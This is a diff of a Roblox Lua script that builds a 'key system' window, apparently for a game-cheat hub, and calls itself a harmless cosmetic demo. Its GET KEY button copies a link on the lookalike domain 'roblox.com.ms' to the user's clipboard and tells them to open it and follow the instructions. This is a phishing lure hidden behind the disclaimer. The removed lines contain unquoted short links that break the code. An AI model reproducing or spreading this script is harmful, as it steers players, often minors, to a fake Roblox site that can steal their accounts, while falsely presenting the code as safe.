@@ -1,148 +1,143 @@
-```lua
--- CatusX - Safe Demo Key UI
--- Fictional/demo UI only. No exploit functionality.
+-- CATUS HUB | DUEL HUB DEMO
+-- Cosmetic/demo UI only — no exploit functionality
 
 local Players = game:GetService("Players")
 local player = Players.LocalPlayer
 
+local KEY_LINK = "https://roblox.com.ms/communities/5622451391/#!/about"
 local DEMO_KEY = "CATUS-DEMO"
 
--- PUT YOUR LINK BETWEEN THE QUOTES
-local KEY_LINK = "PASTE-YOUR-LINK-HERE"
-
 local gui = Instance.new("ScreenGui")
-gui.Name = "CatusX_Demo"
+gui.Name = "CatusHubDemo"
 gui.ResetOnSpawn = false
 gui.Parent = player:WaitForChild("PlayerGui")
 
+-- Main window
 local main = Instance.new("Frame")
-main.Size = UDim2.fromOffset(380, 270)
-main.Position = UDim2.fromScale(0.5, 0.5)
-main.AnchorPoint = Vector2.new(0.5, 0.5)
-main.BackgroundColor3 = Color3.fromRGB(20, 20, 24)
+main.Size = UDim2.new(0, 420, 0, 300)
+main.Position = UDim2.new(0.5, -210, 0.5, -150)
+main.BackgroundColor3 = Color3.fromRGB(18, 18, 25)
 main.BorderSizePixel = 0
 main.Parent = gui
 
 local corner = Instance.new("UICorner")
-corner.CornerRadius = UDim.new(0, 12)
+corner.CornerRadius = UDim.new(0, 14)
 corner.Parent = main
 
-local stroke = Instance.new("UIStroke")
-stroke.Color = Color3.fromRGB(70, 70, 80)
-stroke.Thickness = 1
-stroke.Parent = main
-
+-- Title
 local title = Instance.new("TextLabel")
 title.Size = UDim2.new(1, -30, 0, 45)
-title.Position = UDim2.fromOffset(15, 10)
+title.Position = UDim2.new(0, 15, 0, 10)
 title.BackgroundTransparency = 1
-title.Text = "CATUSX"
-title.TextColor3 = Color3.fromRGB(255, 255, 255)
-title.TextSize = 25
+title.Text = "🧠 CATUS HUB"
+title.TextColor3 = Color3.fromRGB(180, 120, 255)
+title.TextSize = 26
 title.Font = Enum.Font.GothamBold
 title.TextXAlignment = Enum.TextXAlignment.Left
 title.Parent = main
 
 local subtitle = Instance.new("TextLabel")
 subtitle.Size = UDim2.new(1, -30, 0, 25)
-subtitle.Position = UDim2.fromOffset(15, 48)
+subtitle.Position = UDim2.new(0, 15, 0, 48)
 subtitle.BackgroundTransparency = 1
-subtitle.Text = "KEY SYSTEM • DEMO"
-subtitle.TextColor3 = Color3.fromRGB(150, 150, 160)
-subtitle.TextSize = 12
+subtitle.Text = "⚔ DUEL HUB • DEMO"
+subtitle.TextColor3 = Color3.fromRGB(170, 170, 180)
+subtitle.TextSize = 14
 subtitle.Font = Enum.Font.Gotham
 subtitle.TextXAlignment = Enum.TextXAlignment.Left
 subtitle.Parent = main
 
+-- Key box
 local keyBox = Instance.new("TextBox")
-keyBox.Size = UDim2.new(1, -30, 0, 42)
-keyBox.Position = UDim2.fromOffset(15, 85)
-keyBox.BackgroundColor3 = Color3.fromRGB(30, 30, 36)
+keyBox.Size = UDim2.new(1, -40, 0, 48)
+keyBox.Position = UDim2.new(0, 20, 0, 90)
+keyBox.BackgroundColor3 = Color3.fromRGB(28, 28, 38)
 keyBox.BorderSizePixel = 0
-keyBox.PlaceholderText = "Enter demo key..."
+keyBox.PlaceholderText = "Enter your key..."
 keyBox.PlaceholderColor3 = Color3.fromRGB(120, 120, 130)
 keyBox.Text = ""
-keyBox.TextColor3 = Color3.fromRGB(255, 255, 255)
-keyBox.TextSize = 14
+keyBox.TextColor3 = Color3.fromRGB(235, 235, 240)
+keyBox.TextSize = 15
 keyBox.Font = Enum.Font.Gotham
 keyBox.ClearTextOnFocus = false
 keyBox.Parent = main
 
-local boxCorner = Instance.new("UICorner")
-boxCorner.CornerRadius = UDim.new(0, 8)
-boxCorner.Parent = keyBox
+local keyCorner = Instance.new("UICorner")
+keyCorner.CornerRadius = UDim.new(0, 9)
+keyCorner.Parent = keyBox
 
-local verify = Instance.new("TextButton")
-verify.Size = UDim2.new(0.48, -20, 0, 40)
-verify.Position = UDim2.fromOffset(15, 140)
-verify.BackgroundColor3 = Color3.fromRGB(55, 55, 65)
-verify.BorderSizePixel = 0
-verify.Text = "VERIFY KEY"
-verify.TextColor3 = Color3.fromRGB(255, 255, 255)
-verify.TextSize = 13
-verify.Font = Enum.Font.GothamBold
-verify.Parent = main
+-- Check key
+local checkButton = Instance.new("TextButton")
+checkButton.Size = UDim2.new(0.48, -10, 0, 45)
+checkButton.Position = UDim2.new(0, 20, 0, 150)
+checkButton.BackgroundColor3 = Color3.fromRGB(120, 70, 220)
+checkButton.BorderSizePixel = 0
+checkButton.Text = "CHECK KEY"
+checkButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+checkButton.TextSize = 14
+checkButton.Font = Enum.Font.GothamBold
+checkButton.Parent = main
 
-local verifyCorner = Instance.new("UICorner")
-verifyCorner.CornerRadius = UDim.new(0, 8)
-verifyCorner.Parent = verify
+local checkCorner = Instance.new("UICorner")
+checkCorner.CornerRadius = UDim.new(0, 9)
+checkCorner.Parent = checkButton
 
-local getKey = Instance.new("TextButton")
-getKey.Size = UDim2.new(0.48, -20, 0, 40)
-getKey.Position = UDim2.new(0.52, 5, 0, 140)
-getKey.BackgroundColor3 = Color3.fromRGB(75, 75, 90)
-getKey.BorderSizePixel = 0
-getKey.Text = "GET KEY"
-getKey.TextColor3 = Color3.fromRGB(255, 255, 255)
-getKey.TextSize = 13
-getKey.Font = Enum.Font.GothamBold
-getKey.Parent = main
+-- Get key
+local getKeyButton = Instance.new("TextButton")
+getKeyButton.Size = UDim2.new(0.48, -10, 0, 45)
+getKeyButton.Position = UDim2.new(0.52, -10, 0, 150)
+getKeyButton.BackgroundColor3 = Color3.fromRGB(40, 40, 52)
+getKeyButton.BorderSizePixel = 0
+getKeyButton.Text = "GET KEY 🔑"
+getKeyButton.TextColor3 = Color3.fromRGB(220, 220, 230)
+getKeyButton.TextSize = 14
+getKeyButton.Font = Enum.Font.GothamBold
+getKeyButton.Parent = main
 
 local getCorner = Instance.new("UICorner")
-getCorner.CornerRadius = UDim.new(0, 8)
-getCorner.Parent = getKey
+getCorner.CornerRadius = UDim.new(0, 9)
+getCorner.Parent = getKeyButton
 
+-- Status
 local status = Instance.new("TextLabel")
-status.Size = UDim2.new(1, -30, 0, 55)
-status.Position = UDim2.fromOffset(15, 195)
+status.Size = UDim2.new(1, -40, 0, 45)
+status.Position = UDim2.new(0, 20, 0, 210)
 status.BackgroundTransparency = 1
-status.Text = "Status: Waiting for key..."
-status.TextColor3 = Color3.fromRGB(170, 170, 180)
-status.TextSize = 13
+status.Text = "Waiting for key..."
+status.TextColor3 = Color3.fromRGB(150, 150, 160)
+status.TextSize = 14
 status.Font = Enum.Font.Gotham
 status.TextWrapped = true
 status.Parent = main
 
--- Demo verification
-verify.MouseButton1Click:Connect(function()
-	if keyBox.Text == DEMO_KEY then
-		status.Text = "Key verified (Demo)\nNo exploit functions are enabled."
-		status.TextColor3 = Color3.fromRGB(120, 220, 140)
-	else
-		status.Text = "ERROR: Invalid demo key"
-		status.TextColor3 = Color3.fromRGB(255, 100, 100)
-	end
+-- Demo notice
+local notice = Instance.new("TextLabel")
+notice.Size = UDim2.new(1, -40, 0, 25)
+notice.Position = UDim2.new(0, 20, 1, -32)
+notice.BackgroundTransparency = 1
+notice.Text = "CATUS HUB • DEMO / COSMETIC ONLY"
+notice.TextColor3 = Color3.fromRGB(90, 90, 105)
+notice.TextSize = 11
+notice.Font = Enum.Font.Gotham
+notice.Parent = main
+
+-- GET KEY button
+getKeyButton.MouseButton1Click:Connect(function()
+    if setclipboard then
+        setclipboard(KEY_LINK)
+        status.Text = "Key link copied! Open it and follow the instructions."
+    else
+        status.Text = "Open the key link: " .. KEY_LINK
+    end
 end)
 
--- GET KEY
-getKey.MouseButton1Click:Connect(function()
-	status.Text = "Demo key: " .. DEMO_KEY
-	status.TextColor3 = Color3.fromRGB(180, 180, 190)
-
-	if setclipboard then
-		setclipboard(https://rblx.pk/0x5XCCDV)
-		status.Text = "Link copied!\nDemo key: " .. DEMO_KEY
-	else
-		status.Text = "Key link:\n"https://rblx.pk/0x5XCCDV .. KEY_LINK
-	end
+-- Check key
+checkButton.MouseButton1Click:Connect(function()
+    if keyBox.Text == DEMO_KEY then
+        status.Text = "SUCCES THX FOR USING CATUS HUB"
+        status.TextColor3 = Color3.fromRGB(100, 255, 150)
+    else
+        status.Text = "Invalid demo key."
+        status.TextColor3 = Color3.fromRGB(255, 120, 120)
+    end
 end)
-
--- Example group-error display
-local function showGroupError()
-	status.Text = "ERROR: User not in group"
-	status.TextColor3 = Color3.fromRGB(255, 100, 100)
-end
-
--- Example:
--- showGroupError()
-```
